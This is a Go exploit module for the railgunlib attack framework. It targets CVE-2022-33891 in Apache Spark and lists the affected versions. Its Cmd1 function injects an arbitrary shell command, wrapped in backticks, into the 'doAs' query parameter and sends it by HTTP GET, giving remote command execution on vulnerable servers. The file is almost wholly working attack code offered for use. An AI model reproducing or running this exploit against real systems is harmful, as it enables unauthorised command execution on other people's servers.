package exp_Apache_Spark

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
)

type Exp_CVE_2022_33891 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_33891) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	payload := fmt.Sprintf("?doAs=`%s`", url.QueryEscape(cmd))
	httpresp := self.HttpGetWithoutRedirect(self.Params.Target+payload, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	self.EchoInfoMsg(cmd)
	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: exp_model.ExpMsg{
			Author: `lz520520`,
			Time:   `2022-07-18`,
			Range: `
Apache Spark versions 3.0.3 and earlier
versions 3.1.1 to 3.1.2
versions 3.2.0 to 3.2.1
`,
			ID: `CVE-2022-33891`,
			Describe: `
命令执行
`,
			Details: `

`,
			Payload: ``,
			VulType: common.VulCmdExec,
		},
	}

	exp_register.ExpStructRegister(&Exp_CVE_2022_33891{}, registerMsg)

}
